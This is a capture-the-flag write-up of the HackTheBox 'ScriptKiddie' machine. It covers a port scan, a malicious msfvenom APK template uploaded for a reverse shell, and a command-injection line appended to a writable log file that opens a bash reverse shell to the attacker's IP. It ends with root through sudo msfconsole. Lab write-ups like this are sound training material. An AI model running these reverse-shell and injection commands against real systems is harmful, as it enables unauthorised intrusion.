---
layout: post
title: "ScriptKiddie"
date: 2022-03-14
categories: [HackTheBox, Easy-HTB]
tags: [reverse-shell, metasploit, linux]
image: ../../assets/img/posts/ScriptKiddie.png

---

|**Machine**|[ScriptKiddie](https://app.hackthebox.com/machines/314)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[0xdf](https://app.hackthebox.com/users/4935)|

---

We'll start with connecting to HTB network by making connection with .ovpn file and then spin up machine. This box's IP is **10.10.10.226**.

Let's get started with nmap scan,

```bash
sudo nmap -A -T4 -p- 10.10.10.226 -oN nmap_scan
``` 

![image](https://user-images.githubusercontent.com/67465230/158149956-539b4179-236c-44b5-8557-f507dc61dac9.png)

We get the result with open ports 22 (SSH), 5000 (HTTP){unusual}.

Let's visit http://10.10.10.226:5000/,

![image](https://user-images.githubusercontent.com/67465230/158149967-774b06ae-e23d-4325-b5a6-0c567e160336.png)

It seems like this is a pre-built tool for newbie hackers. There seems to be many vulnerabilities like LFI, RFI, Command Injection, etc which we can used to get malicious with them to get shell on this machine. But after trying many vulns against machine, I've come across file upload vulnerability which can get us reverse shell.

Malicious Payload Creation: We'll create a payload which will work to get us a reverse shell. To create one, google "**template unix file exploit**" and click on rapid7 link [metasploit_msfvenom_apk_template_cmd_injection](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/). It has given how to make a template so we'll follow that and make a malicious file for us.

![image](https://user-images.githubusercontent.com/67465230/158149972-e97fa92a-ae08-470a-a58d-f414db0c4143.png)

there we've it in our local dir. Now, we'll start our netcat listener on port 4444 and upload this exploit on webpage,

after changing options, we can click on generate button

![image](https://user-images.githubusercontent.com/67465230/158149981-39500172-173d-41ab-b2bd-eae6384b0de1.png)

as soon as this file gets uploaded, we'll get our reverse shell on netcat using `nc -nvlp 4444`,

![image](https://user-images.githubusercontent.com/67465230/158149999-11b26381-e57c-4885-ba0b-8ec490eecfd6.png)

okay so we're in as **kid** user. But let's first upgrade the functionality of this shell,

```bash
/bin/bash -i
``` 

![image](https://user-images.githubusercontent.com/67465230/158150027-e89dc0b1-c79c-4039-bf5d-744b218d0dd5.png)

okay so we got functional shell. Let's look for user flag,

let's check where we are using **pwd** command and establish everything using **ls** command,

![image](https://user-images.githubusercontent.com/67465230/158150043-48b4b948-2ec2-4b67-bd99-f587e9d6f6e7.png)

we can see the user flag. 

![image](https://user-images.githubusercontent.com/67465230/158150051-f623de68-2f23-4237-abef-b0ecb631295f.png)

After some enum, I found that there is another user **pwn** and we cannot simply escalate privileges to root.
 
![image](https://user-images.githubusercontent.com/67465230/158150051-f623de68-2f23-4237-abef-b0ecb631295f.png)

So we'll have to do lateral escalation. There's a file in logs dir which has some permissions, let's view that

`ls -la` 

![image](https://user-images.githubusercontent.com/67465230/158150071-35c35176-e5b5-459a-a767-11fabe76f0f3.png)

we can see that we can write on this file and group is of pwn user. Let's start our netcat listener on new terminal and then we'll write the reverse shell one liner into file, which will get us reverse shell.

```bash
echo " ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.154/9002 0>&1' #" >> hackers
``` 

when this command runs, we'll instantly get **pwn** user shell.

![image](https://user-images.githubusercontent.com/67465230/158150078-7d793fb6-32e8-42a3-b24d-f2f506589555.png)

we're pwn user. 

Now's the time for privilege escalation. So we'll look for binaries which we can run using **sudo** command,

```bash
sudo -l
``` 

![image](https://user-images.githubusercontent.com/67465230/158150096-df1aacc7-eb64-4eb8-ae9c-27d912c968b9.png)

and we can see that we can run msfconsole with sudo command w/o providing password. Let's fire this command to see what happens,

```bash
sudo /opt/metasploit-framework-6.0.9/msfconsole
``` 

![image](https://user-images.githubusercontent.com/67465230/158150101-3d20adef-8b76-48a9-b3fb-e5c88b7318af.png)

and we got system shell!!!! Let's look for root flag,

navigating to root dir and cat out root flag's content,

```bash
cat root.txt
```

![image](https://user-images.githubusercontent.com/67465230/158150114-7fec1176-bbaf-485a-b3a3-36e7fe4078e3.png)